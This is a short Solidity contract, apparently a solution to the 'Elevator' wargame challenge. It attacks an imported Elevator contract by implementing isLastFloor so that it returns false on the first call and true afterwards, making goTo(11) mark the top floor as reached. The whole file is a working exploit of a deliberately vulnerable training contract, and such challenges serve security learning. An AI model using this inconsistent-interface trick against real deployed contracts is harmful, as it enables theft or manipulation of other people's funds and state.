import "./Elevator.sol";

pragma solidity ^0.8.0;

contract Attack_Elevator {

    Elevator victim;
    uint public counter = 0;

    constructor (address _victimAddr) {
        victim = Elevator(_victimAddr);
    }

    function isLastFloor(uint) external returns (bool) {
        uint count = 0;
        if (counter == 0 && count == 0) {
            counter = 1;
            count = 1;
            return false;
        } else {
            return true;
        }
    }

    function attack() public {
        victim.goTo(11);
    }
}